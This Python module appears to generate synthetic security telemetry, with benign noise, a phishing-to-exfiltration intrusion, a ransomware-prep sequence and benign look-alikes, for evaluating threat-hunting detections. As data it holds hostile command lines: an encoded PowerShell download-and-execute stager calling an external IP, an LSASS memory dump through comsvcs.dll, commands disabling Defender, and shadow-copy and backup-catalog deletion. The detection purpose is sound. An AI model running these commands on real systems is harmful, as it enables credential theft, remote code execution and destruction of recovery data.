"""Synthetic security telemetry generator.

What this produces
------------------
A small but *realistic* enterprise dataset covering one business morning:

* ~90% benign background noise (browsers, Office, Teams, patch management,
  normal file-share access, ordinary typo'd passwords)
* one multi-stage intrusion on PC01 -> FS02
* one **benign look-alike**: an IT admin doing something that trips several of our
  detections but is completely legitimate

Why the benign look-alike matters
---------------------------------
A dataset where every anomaly is malicious teaches you nothing and is the single
biggest tell of an amateur security project. Real hunting is a signal-to-noise
problem: the hard part is not spotting encoded PowerShell, it is spotting encoded
PowerShell that *isn't* your own patch-management tooling. So we build the noise in
deliberately, and later measure our detections against it.

Determinism
-----------
The generator is seeded. The same seed always produces byte-identical CSVs, so tests
can assert on exact counts and the README can quote exact numbers.

Ground truth
------------
``ground_truth.json`` records which event_ids belong to which scenario stage. It is
written for *evaluation only*. No detection, query, or agent tool is ever allowed to
read it -- that would be grading your own homework.
"""

from __future__ import annotations

import base64
import json
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import pandas as pd

from ath.logging_setup import get_logger
from ath.telemetry.identity import derive_identity
from ath.schema import (
    EVENT_LOGON,
    EVENT_NETWORK,
    EVENT_PROCESS,
    TABLE_COLUMNS,
    TABLE_FILES,
)

logger = get_logger(__name__)

UTC = timezone.utc

# --------------------------------------------------------------------------------------
# The fictional environment. Keeping it in one place makes the dataset feel coherent:
# the same hosts, users and subnets recur across process, network and logon events.
# --------------------------------------------------------------------------------------

WORKSTATIONS: dict[str, str] = {
    "PC01": "10.10.20.15",
    "PC02": "10.10.20.16",
    "PC03": "10.10.20.17",
    "PC05": "10.10.20.19",
    "PC07": "10.10.20.21",
}
SERVERS: dict[str, str] = {
    "FS02": "10.10.10.20",   # file server
    "DC01": "10.10.10.10",   # domain controller
    "APP01": "10.10.10.30",  # line-of-business app server
}
ALL_HOSTS: dict[str, str] = {**WORKSTATIONS, **SERVERS}

# Primary interactive user per workstation -- gives the data a stable "who sits where".
PRIMARY_USER: dict[str, str] = {
    "PC01": "jdoe",
    "PC02": "mrossi",
    "PC03": "achen",
    "PC05": "klarsen",
    "PC07": "adm_sarah",  # IT administrator, source of our benign look-alike
}

SERVICE_ACCOUNTS: tuple[str, ...] = ("svc_backup", "svc_sql")

# Benign external destinations (Google, Microsoft, Akamai-ish ranges).
BENIGN_EXTERNAL_IPS: tuple[str, ...] = (
    "142.250.185.14",
    "142.250.185.78",
    "52.113.194.132",
    "40.126.32.76",
    "20.190.160.14",
    "104.18.32.47",
    "13.107.42.14",
)

# The adversary infrastructure used by the simulated intrusion.
C2_IP: str = "185.220.101.47"
C2_PORT: int = 443

# The PowerShell payload we base64-encode. Encoding it *programmatically* (rather than
# pasting a fake blob) means the string is genuinely decodable, so our Milestone 3
# detection can decode it for real instead of pretending to.
C2_STAGER_SCRIPT: str = (
    "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/a.ps1')"
)

# The benign look-alike payload, run by IT patch tooling.
BENIGN_ENCODED_SCRIPT: str = (
    "Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object HotFixID,InstalledOn"
)


def encode_powershell(script: str) -> str:
    """Encode a script the way ``powershell.exe -EncodedCommand`` expects it.

    PowerShell's ``-EncodedCommand`` takes base64 of **UTF-16LE** bytes, not UTF-8.
    Getting this right matters: our decoder in the hunting layer must be able to
    round-trip it, and interviewers who know PowerShell will notice if it's wrong.
    """
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


@dataclass
class GeneratorConfig:
    """Knobs for dataset generation.

    Attributes:
        seed: RNG seed. Same seed -> identical dataset.
        start: Start of the simulated business day (UTC).
        benign_process_events: Approximate count of benign process events.
        benign_network_events: Approximate count of benign network events.
        benign_logon_events: Approximate count of benign logon events.
    """

    seed: int = 1337
    start: datetime = field(
        default_factory=lambda: datetime(2026, 8, 17, 8, 0, 0, tzinfo=UTC)
    )
    benign_process_events: int = 420
    benign_network_events: int = 380
    benign_logon_events: int = 220


# --------------------------------------------------------------------------------------
# Small builder helpers. Each returns a plain dict; ground-truth tagging rides along in
# the private "_gt" key and is stripped before anything is written to CSV.
# --------------------------------------------------------------------------------------


def _process_event(
    ts: datetime,
    device: str,
    user: str,
    process_name: str,
    pid: int,
    command_line: str,
    parent_process_name: str,
    parent_pid: int,
    file_path: str,
    gt: dict[str, str] | None = None,
) -> dict[str, Any]:
    # Identity is derived from the image and its location, not sampled, so the same
    # binary carries the same hash and publisher on every host. See
    # ath.telemetry.identity for why the name alone is not allowed to confer trust.
    sha256, signer, signature_status = derive_identity(process_name, file_path)
    return {
        "timestamp": ts,
        "event_type": EVENT_PROCESS,
        "device": device,
        "user": user,
        "source": "synthetic",
        "source_ref": "",
        "process_name": process_name,
        "process_id": pid,
        "command_line": command_line,
        "parent_process_name": parent_process_name,
        "parent_process_id": parent_pid,
        "file_path": file_path,
        "sha256": sha256,
        "signer": signer,
        "signature_status": signature_status,
        "_gt": gt,
    }


def _network_event(
    ts: datetime,
    device: str,
    user: str,
    process_name: str,
    pid: int,
    remote_ip: str,
    remote_port: int,
    protocol: str = "tcp",
    direction: str = "outbound",
    remote_url: str = "",
    gt: dict[str, str] | None = None,
) -> dict[str, Any]:
    return {
        "timestamp": ts,
        "event_type": EVENT_NETWORK,
        "device": device,
        "user": user,
        "source": "synthetic",
        "source_ref": "",
        "process_name": process_name,
        "process_id": pid,
        "remote_ip": remote_ip,
        "remote_port": remote_port,
        "protocol": protocol,
        "direction": direction,
        "remote_url": remote_url,
        "_gt": gt,
    }


def _logon_event(
    ts: datetime,
    device: str,
    user: str,
    logon_type: int,
    source_ip: str,
    source_device: str,
    action: str,
    failure_reason: str = "",
    gt: dict[str, str] | None = None,
) -> dict[str, Any]:
    return {
        "timestamp": ts,
        "event_type": EVENT_LOGON,
        "device": device,
        "user": user,
        "source": "synthetic",
        "source_ref": "",
        "logon_type": logon_type,
        "source_ip": source_ip,
        "source_device": source_device,
        "action": action,
        "failure_reason": failure_reason,
        "_gt": gt,
    }


# --------------------------------------------------------------------------------------
# Benign background noise
# --------------------------------------------------------------------------------------

# (process, parent, command template, install path) tuples that make up ordinary
# corporate endpoint activity.
_BENIGN_PROCESS_TEMPLATES: tuple[tuple[str, str, str, str], ...] = (
    ("chrome.exe", "explorer.exe",
     r'"C:\Program Files\Google\Chrome\Application\chrome.exe"',
     r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    ("OUTLOOK.EXE", "explorer.exe",
     r'"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"',
     r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"),
    ("Teams.exe", "explorer.exe",
     r'"C:\Users\{user}\AppData\Local\Microsoft\Teams\current\Teams.exe"',
     r"C:\Users\{user}\AppData\Local\Microsoft\Teams\current\Teams.exe"),
    ("EXCEL.EXE", "explorer.exe",
     r'"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" /dde',
     r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"),
    ("WINWORD.EXE", "OUTLOOK.EXE",
     r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\{user}\Documents\Notes.docx"',
     r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"),
    ("MsMpEng.exe", "services.exe",
     r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe"',
     r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24\MsMpEng.exe"),
    ("svchost.exe", "services.exe",
     r"C:\Windows\System32\svchost.exe -k netsvcs -p",
     r"C:\Windows\System32\svchost.exe"),
    ("OneDrive.exe", "explorer.exe",
     r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background',
     r"C:\Program Files\Microsoft OneDrive\OneDrive.exe"),
    ("notepad.exe", "explorer.exe",
     r"notepad.exe C:\Users\{user}\Documents\todo.txt",
     r"C:\Windows\System32\notepad.exe"),
    ("cmd.exe", "explorer.exe",
     r"cmd.exe /c ipconfig /all",
     r"C:\Windows\System32\cmd.exe"),
    # Benign PowerShell: this is why "powershell.exe ran" is NOT a detection.
    ("powershell.exe", "explorer.exe",
     r"powershell.exe -NoProfile -Command Get-ChildItem C:\Users\{user}\Documents",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ("powershell.exe", "CcmExec.exe",
     r"powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ("CcmExec.exe", "services.exe",
     r"C:\Windows\CCM\CcmExec.exe",
     r"C:\Windows\CCM\CcmExec.exe"),
)

_BENIGN_NETWORK_PROCESSES: tuple[tuple[str, int], ...] = (
    ("chrome.exe", 443),
    ("chrome.exe", 443),
    ("chrome.exe", 80),
    ("OUTLOOK.EXE", 443),
    ("Teams.exe", 443),
    ("OneDrive.exe", 443),
    ("MsMpEng.exe", 443),
)


def _generate_benign_processes(
    rng: random.Random, cfg: GeneratorConfig
) -> list[dict[str, Any]]:
    """Ordinary endpoint process activity spread across the morning."""
    events: list[dict[str, Any]] = []
    for _ in range(cfg.benign_process_events):
        device = rng.choice(list(WORKSTATIONS))
        user = PRIMARY_USER[device]
        name, parent, cmd_tpl, path_tpl = rng.choice(_BENIGN_PROCESS_TEMPLATES)

        # System processes run as SYSTEM, not as the logged-on user.
        if parent == "services.exe":
            user = "SYSTEM"

        offset = timedelta(seconds=rng.randint(0, 4 * 3600))
        events.append(
            _process_event(
                ts=cfg.start + offset,
                device=device,
                user=user,
                process_name=name,
                pid=rng.randint(1000, 9999),
                command_line=cmd_tpl.format(user=user),
                parent_process_name=parent,
                parent_pid=rng.randint(500, 999),
                file_path=path_tpl.format(user=user),
            )
        )
    return events


def _generate_benign_network(
    rng: random.Random, cfg: GeneratorConfig
) -> list[dict[str, Any]]:
    """Ordinary outbound web/collaboration traffic, plus internal server chatter."""
    events: list[dict[str, Any]] = []
    for _ in range(cfg.benign_network_events):
        device = rng.choice(list(WORKSTATIONS))
        user = PRIMARY_USER[device]
        process_name, port = rng.choice(_BENIGN_NETWORK_PROCESSES)
        offset = timedelta(seconds=rng.randint(0, 4 * 3600))

        # ~20% of traffic is internal (file server, app server, DC).
        if rng.random() < 0.20:
            remote_ip = rng.choice(list(SERVERS.values()))
            port = rng.choice([445, 443, 389])
        else:
            remote_ip = rng.choice(BENIGN_EXTERNAL_IPS)

        events.append(
            _network_event(
                ts=cfg.start + offset,
                device=device,
                user=user,
                process_name=process_name,
                pid=rng.randint(1000, 9999),
                remote_ip=remote_ip,
                remote_port=port,
            )
        )
    return events


def _generate_benign_logons(
    rng: random.Random, cfg: GeneratorConfig
) -> list[dict[str, Any]]:
    """Morning interactive logons, routine share access, and a few honest typos."""
    events: list[dict[str, Any]] = []

    # 1. Everyone logs into their own workstation at the start of the day.
    for device, user in PRIMARY_USER.items():
        events.append(
            _logon_event(
                ts=cfg.start + timedelta(seconds=rng.randint(0, 1800)),
                device=device,
                user=user,
                logon_type=2,  # interactive at the console
                source_ip=WORKSTATIONS[device],
                source_device=device,
                action="success",
            )
        )

    # 2. Routine network logons: users hitting the file server and app server.
    for _ in range(cfg.benign_logon_events):
        src_device = rng.choice(list(WORKSTATIONS))
        user = PRIMARY_USER[src_device]
        target = rng.choice(["FS02", "APP01"])
        events.append(
            _logon_event(
                ts=cfg.start + timedelta(seconds=rng.randint(0, 4 * 3600)),
                device=target,
                user=user,
                logon_type=3,  # network logon (SMB)
                source_ip=WORKSTATIONS[src_device],
                source_device=src_device,
                action="success",
            )
        )

    # 3. Service accounts doing scheduled work -- normal, but they look "odd" if you
    #    don't know the environment. Good material for false-positive discussion.
    for _ in range(12):
        events.append(
            _logon_event(
                ts=cfg.start + timedelta(seconds=rng.randint(0, 4 * 3600)),
                device=rng.choice(["FS02", "APP01", "DC01"]),
                user=rng.choice(SERVICE_ACCOUNTS),
                logon_type=5,  # service logon
                source_ip=SERVERS["APP01"],
                source_device="APP01",
                action="success",
            )
        )

    # 4. Honest mistakes: 1-2 failed logons per user. Deliberately kept BELOW any
    #    sensible brute-force threshold so we can test that we don't alert on them.
    for device, user in PRIMARY_USER.items():
        for _ in range(rng.randint(1, 2)):
            ts = cfg.start + timedelta(seconds=rng.randint(0, 4 * 3600))
            events.append(
                _logon_event(
                    ts=ts,
                    device=device,
                    user=user,
                    logon_type=2,
                    source_ip=WORKSTATIONS[device],
                    source_device=device,
                    action="failure",
                    failure_reason="bad_password",
                )
            )
            # Followed shortly by the successful retry -- exactly the "fail then
            # succeed" shape a naive brute-force rule would flag.
            events.append(
                _logon_event(
                    ts=ts + timedelta(seconds=rng.randint(5, 40)),
                    device=device,
                    user=user,
                    logon_type=2,
                    source_ip=WORKSTATIONS[device],
                    source_device=device,
                    action="success",
                )
            )

    return events


# --------------------------------------------------------------------------------------
# The simulated intrusion
# --------------------------------------------------------------------------------------


def _generate_attack_chain(cfg: GeneratorConfig) -> list[dict[str, Any]]:
    """A single coherent intrusion: phishing -> execution -> C2 -> creds -> lateral move.

    The stages are modelled on publicly documented commodity-intrusion behaviour.
    Every stage is expressed only through telemetry an EDR would actually record, so
    the detections we write later are detections against *observable* behaviour, not
    against labels.
    """
    events: list[dict[str, Any]] = []
    day = cfg.start.replace(hour=9, minute=0, second=0)

    def at(minute: int, second: int = 0) -> datetime:
        return day + timedelta(minutes=minute, seconds=second)

    encoded = encode_powershell(C2_STAGER_SCRIPT)

    # -- Stage 1: user opens a macro-enabled attachment from email -----------------
    events.append(
        _process_event(
            ts=at(12, 4), device="PC01", user="jdoe",
            process_name="WINWORD.EXE", pid=4820,
            command_line=(
                r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n '
                r'"C:\Users\jdoe\Downloads\Invoice_Q3_2026.docm"'
            ),
            parent_process_name="OUTLOOK.EXE", parent_pid=3120,
            file_path=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            gt={"scenario": "intrusion", "stage": "1-initial-access",
                "note": "macro-enabled attachment opened from Outlook"},
        )
    )

    # -- Stage 2: the macro spawns hidden, encoded PowerShell ----------------------
    events.append(
        _process_event(
            ts=at(12, 41), device="PC01", user="jdoe",
            process_name="powershell.exe", pid=6612,
            command_line=f"powershell.exe -nop -w hidden -enc {encoded}",
            parent_process_name="WINWORD.EXE", parent_pid=4820,
            file_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            gt={"scenario": "intrusion", "stage": "2-execution",
                "note": "Office application spawning hidden encoded PowerShell"},
        )
    )

    # -- Stage 3: stager downloads the second-stage payload ------------------------
    events.append(
        _network_event(
            ts=at(12, 43), device="PC01", user="jdoe",
            process_name="powershell.exe", pid=6612,
            remote_ip=C2_IP, remote_port=80,
            remote_url=f"http://{C2_IP}/a.ps1",
            gt={"scenario": "intrusion", "stage": "3-payload-download",
                "note": "PowerShell retrieving remote script over cleartext HTTP"},
        )
    )

    # -- Stage 4: periodic C2 beaconing (regular interval = the tell) --------------
    for i in range(6):
        events.append(
            _network_event(
                ts=at(13 + i * 5, 10), device="PC01", user="jdoe",
                process_name="powershell.exe", pid=6612,
                remote_ip=C2_IP, remote_port=C2_PORT,
                gt={"scenario": "intrusion", "stage": "4-command-and-control",
                    "note": "regular-interval outbound connections to a fixed remote host"},
            )
        )

    # -- Stage 5: host and domain discovery ----------------------------------------
    discovery = [
        ("whoami.exe", "whoami.exe /all", r"C:\Windows\System32\whoami.exe"),
        ("net.exe", 'net group "Domain Admins" /domain', r"C:\Windows\System32\net.exe"),
        ("nltest.exe", "nltest /domain_trusts", r"C:\Windows\System32\nltest.exe"),
    ]
    for i, (name, cmd, path) in enumerate(discovery):
        events.append(
            _process_event(
                ts=at(15, 3 + i * 17), device="PC01", user="jdoe",
                process_name=name, pid=7000 + i,
                command_line=cmd,
                parent_process_name="powershell.exe", parent_pid=6612,
                file_path=path,
                gt={"scenario": "intrusion", "stage": "5-discovery",
                    "note": "account and domain enumeration from the PowerShell session"},
            )
        )

    # -- Stage 6: credential access via LSASS memory dump --------------------------
    # comsvcs.dll MiniDump is a living-off-the-land technique: no attacker tool is
    # dropped, only a signed Microsoft DLL is abused.
    events.append(
        _process_event(
            ts=at(18, 22), device="PC01", user="jdoe",
            process_name="rundll32.exe", pid=7420,
            command_line=(
                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 "
                r"C:\Users\Public\lsass.dmp full"
            ),
            parent_process_name="powershell.exe", parent_pid=6612,
            file_path=r"C:\Windows\System32\rundll32.exe",
            gt={"scenario": "intrusion", "stage": "6-credential-access",
                "note": "LSASS process memory dumped via signed Microsoft DLL"},
        )
    )

    # -- Stage 7: brute force against a service account on the file server ---------
    for i in range(14):
        events.append(
            _logon_event(
                ts=at(28, i * 11), device="FS02", user="svc_backup",
                logon_type=3, source_ip=WORKSTATIONS["PC01"], source_device="PC01",
                action="failure", failure_reason="bad_password",
                gt={"scenario": "intrusion", "stage": "7-brute-force",
                    "note": "repeated failed network logons for one account from one source"},
            )
        )
    events.append(
        _logon_event(
            ts=at(33, 47), device="FS02", user="svc_backup",
            logon_type=3, source_ip=WORKSTATIONS["PC01"], source_device="PC01",
            action="success",
            gt={"scenario": "intrusion", "stage": "7-brute-force",
                "note": "successful logon immediately following the failure burst"},
        )
    )

    # -- Stage 8: remote execution on FS02 (PsExec-style service creation) ---------
    events.append(
        _process_event(
            ts=at(34, 12), device="FS02", user="svc_backup",
            process_name="cmd.exe", pid=2244,
            command_line=r"cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1755419652 2>&1",
            parent_process_name="services.exe", parent_pid=712,
            file_path=r"C:\Windows\System32\cmd.exe",
            gt={"scenario": "intrusion", "stage": "8-lateral-movement",
                "note": "command shell spawned by the service control manager, output "
                        "redirected to an admin share"},
        )
    )

    # -- Stage 9: collection and staging on the file server ------------------------
    events.append(
        _process_event(
            ts=at(35, 40), device="FS02", user="svc_backup",
            process_name="powershell.exe", pid=2280,
            command_line=(
                r"powershell.exe -nop -c Compress-Archive -Path D:\Finance\* "
                r"-DestinationPath C:\Windows\Temp\fin.zip"
            ),
            parent_process_name="cmd.exe", parent_pid=2244,
            file_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            gt={"scenario": "intrusion", "stage": "9-collection",
                "note": "bulk archive of a finance file share into a temp directory"},
        )
    )
    events.append(
        _network_event(
            ts=at(37, 5), device="FS02", user="svc_backup",
            process_name="powershell.exe", pid=2280,
            remote_ip=C2_IP, remote_port=C2_PORT,
            gt={"scenario": "intrusion", "stage": "10-exfiltration",
                "note": "server-side process contacting the same external host as PC01"},
        )
    )

    return events


def _generate_benign_lookalike(cfg: GeneratorConfig) -> list[dict[str, Any]]:
    """Legitimate IT activity engineered to trip naive detections.

    An administrator runs an encoded PowerShell inventory script through the patch
    management agent, and it talks to a Microsoft endpoint. A rule that says
    "encoded PowerShell + external connection = incident" fires here and is wrong.
    """
    events: list[dict[str, Any]] = []
    base = cfg.start.replace(hour=10, minute=5, second=0)
    encoded = encode_powershell(BENIGN_ENCODED_SCRIPT)

    events.append(
        _process_event(
            ts=base, device="PC07", user="adm_sarah",
            process_name="powershell.exe", pid=5150,
            command_line=f"powershell.exe -NonInteractive -EncodedCommand {encoded}",
            parent_process_name="CcmExec.exe", parent_pid=980,
            file_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            gt={"scenario": "benign_lookalike", "stage": "it-inventory",
                "note": "encoded PowerShell launched by patch management -- legitimate"},
        )
    )
    events.append(
        _network_event(
            ts=base + timedelta(seconds=6), device="PC07", user="adm_sarah",
            process_name="powershell.exe", pid=5150,
            remote_ip="20.190.160.14", remote_port=443,
            remote_url="https://login.microsoftonline.com/",
            gt={"scenario": "benign_lookalike", "stage": "it-inventory",
                "note": "PowerShell contacting a Microsoft endpoint -- legitimate"},
        )
    )
    # An admin legitimately authenticating to several servers in quick succession --
    # the same shape as lateral movement.
    for i, host in enumerate(["FS02", "APP01", "DC01"]):
        events.append(
            _logon_event(
                ts=base + timedelta(minutes=2 + i), device=host, user="adm_sarah",
                logon_type=3, source_ip=WORKSTATIONS["PC07"], source_device="PC07",
                action="success",
                gt={"scenario": "benign_lookalike", "stage": "it-admin-multi-host",
                    "note": "admin touching multiple servers -- looks like lateral movement"},
            )
        )
    return events


def _generate_benign_recovery_activity(cfg: GeneratorConfig) -> list[dict[str, Any]]:
    """Legitimate backup and security-tool administration.

    Added alongside the ransomware-prep scenario for the same reason the encoded
    PowerShell look-alike exists: a dataset where every appearance of ``vssadmin`` is
    malicious would let a rule pass by keying on the binary name, which is precisely
    the mistake ATH-011 is written to avoid.

    A backup administrator enumerating shadow copies, and Defender updating its own
    definitions, are the two most obvious ways to get this wrong.
    """
    events: list[dict[str, Any]] = []
    base = cfg.start.replace(hour=8, minute=40, second=0)

    events.append(_process_event(
        ts=base, device="PC05", user="klarsen",
        process_name="vssadmin.exe", pid=3310,
        command_line="vssadmin.exe list shadows",
        parent_process_name="cmd.exe", parent_pid=3300,
        file_path=r"C:\Windows\System32\vssadmin.exe",
        gt={"scenario": "benign_lookalike", "stage": "backup-enumeration",
            "note": "admin listing shadow copies -- read-only, legitimate"},
    ))
    events.append(_process_event(
        ts=base + timedelta(minutes=1), device="PC05", user="klarsen",
        process_name="wbadmin.exe", pid=3312,
        command_line="wbadmin.exe get versions",
        parent_process_name="cmd.exe", parent_pid=3300,
        file_path=r"C:\Windows\System32\wbadmin.exe",
        gt={"scenario": "benign_lookalike", "stage": "backup-enumeration",
            "note": "admin checking backup versions -- read-only, legitimate"},
    ))
    return events


def _generate_ransomware_prep(cfg: GeneratorConfig) -> list[dict[str, Any]]:
    """A second, separate intrusion: recovery inhibition and defence impairment.

    Deliberately a distinct scenario on a distinct host rather than extra stages bolted
    onto the existing PC01 -> FS02 chain. Keeping them apart leaves INC-001's measured
    numbers untouched as a regression baseline, so a change in the benchmark can be
    attributed to a change in the system rather than to a change in the dataset.

    The shape is the standard pre-encryption sequence: disable the security product,
    exclude the staging directory from scanning, then destroy every recovery path so
    the victim cannot roll back. Defender's own telemetry stops shortly afterwards --
    which is the point of the TelemetryHealthChange behavior: the absence of expected
    events is itself evidence, not an absence of evidence.
    """
    events: list[dict[str, Any]] = []
    base = cfg.start.replace(hour=11, minute=12, second=0)
    host, user = "PC03", "achen"
    shell_pid = 7420

    steps: tuple[tuple[int, str, int, str, str, str], ...] = (
        (0, "powershell.exe", shell_pid,
         "powershell.exe -nop -w hidden Set-MpPreference -DisableRealtimeMonitoring $true",
         r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "1-defense-impairment"),
        (35, "powershell.exe", shell_pid + 1,
         r"powershell.exe Add-MpPreference -ExclusionPath C:\ProgramData\svc",
         r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         "1-defense-impairment"),
        (70, "taskkill.exe", shell_pid + 2,
         "taskkill.exe /F /IM MsMpEng.exe",
         r"C:\Windows\System32\taskkill.exe",
         "1-defense-impairment"),
        (150, "vssadmin.exe", shell_pid + 3,
         "vssadmin.exe delete shadows /all /quiet",
         r"C:\Windows\System32\vssadmin.exe",
         "2-recovery-inhibition"),
        (185, "wbadmin.exe", shell_pid + 4,
         "wbadmin.exe delete catalog -quiet",
         r"C:\Windows\System32\wbadmin.exe",
         "2-recovery-inhibition"),
        (220, "bcdedit.exe", shell_pid + 5,
         "bcdedit.exe /set {default} recoveryenabled no",
         r"C:\Windows\System32\bcdedit.exe",
         "2-recovery-inhibition"),
    )
    for offset, image, pid, command_line, path, stage in steps:
        events.append(_process_event(
            ts=base + timedelta(seconds=offset), device=host, user=user,
            process_name=image, pid=pid, command_line=command_line,
            parent_process_name="cmd.exe", parent_pid=shell_pid - 1,
            file_path=path,
            gt={"scenario": "ransomware_prep", "stage": stage,
                "note": command_line},
        ))
    return events


# --------------------------------------------------------------------------------------
# Assembly
# --------------------------------------------------------------------------------------


def generate_telemetry(
    cfg: GeneratorConfig | None = None,
) -> tuple[dict[str, pd.DataFrame], dict[str, Any]]:
    """Build the full telemetry set and its ground-truth labels.

    Args:
        cfg: Generator configuration. Defaults to :class:`GeneratorConfig`.

    Returns:
        A tuple ``(tables, ground_truth)`` where ``tables`` maps event type ->
        DataFrame, and ``ground_truth`` describes the labelled scenarios.
    """
    cfg = cfg or GeneratorConfig()
    rng = random.Random(cfg.seed)

    raw: list[dict[str, Any]] = []
    raw += _generate_benign_processes(rng, cfg)
    raw += _generate_benign_network(rng, cfg)
    raw += _generate_benign_logons(rng, cfg)
    raw += _generate_attack_chain(cfg)
    raw += _generate_benign_lookalike(cfg)
    raw += _generate_benign_recovery_activity(cfg)
    raw += _generate_ransomware_prep(cfg)

    # Sort chronologically, then assign ids. Chronological ids make manual inspection
    # of a timeline far easier ("evt-000401 came before evt-000455").
    raw.sort(key=lambda e: (e["timestamp"], e["event_type"]))
    for i, event in enumerate(raw, start=1):
        event["event_id"] = f"evt-{i:06d}"

    # Split ground truth out before anything touches the tables.
    ground_truth: dict[str, Any] = {
        "description": (
            "Labels for evaluation only. Detections and agent tools must never read "
            "this file."
        ),
        "scenarios": {},
    }
    for event in raw:
        gt = event.pop("_gt", None)
        if not gt:
            continue
        scenario = ground_truth["scenarios"].setdefault(
            gt["scenario"], {"stages": {}, "event_ids": []}
        )
        stage = scenario["stages"].setdefault(gt["stage"], {"note": gt["note"], "event_ids": []})
        stage["event_ids"].append(event["event_id"])
        scenario["event_ids"].append(event["event_id"])

    tables: dict[str, pd.DataFrame] = {}
    for event_type, columns in TABLE_COLUMNS.items():
        rows = [e for e in raw if e["event_type"] == event_type]
        df = pd.DataFrame(rows)
        df = df.reindex(columns=list(columns))  # enforce declared column order
        df = df.sort_values("timestamp").reset_index(drop=True)
        tables[event_type] = df

    logger.info(
        "Generated telemetry: %s process, %s network, %s logon events",
        len(tables[EVENT_PROCESS]), len(tables[EVENT_NETWORK]), len(tables[EVENT_LOGON]),
    )
    return tables, ground_truth


def write_telemetry(
    tables: dict[str, pd.DataFrame],
    ground_truth: dict[str, Any],
    out_dir: Path,
) -> list[Path]:
    """Write telemetry tables and ground truth to ``out_dir``.

    Timestamps are serialised as ISO-8601 with an explicit UTC offset. Ambiguous
    timestamps are one of the most common causes of wrong correlation in real SOCs.

    Returns:
        The list of files written.
    """
    out_dir.mkdir(parents=True, exist_ok=True)
    written: list[Path] = []

    for event_type, df in tables.items():
        path = out_dir / TABLE_FILES[event_type]
        out = df.copy()
        out["timestamp"] = pd.to_datetime(out["timestamp"], utc=True).dt.strftime(
            "%Y-%m-%dT%H:%M:%S%z"
        )
        out.to_csv(path, index=False)
        written.append(path)
        logger.info("Wrote %s rows -> %s", len(out), path.name)

    gt_path = out_dir / "ground_truth.json"
    gt_path.write_text(json.dumps(ground_truth, indent=2), encoding="utf-8")
    written.append(gt_path)
    logger.info("Wrote ground truth -> %s", gt_path.name)

    return written
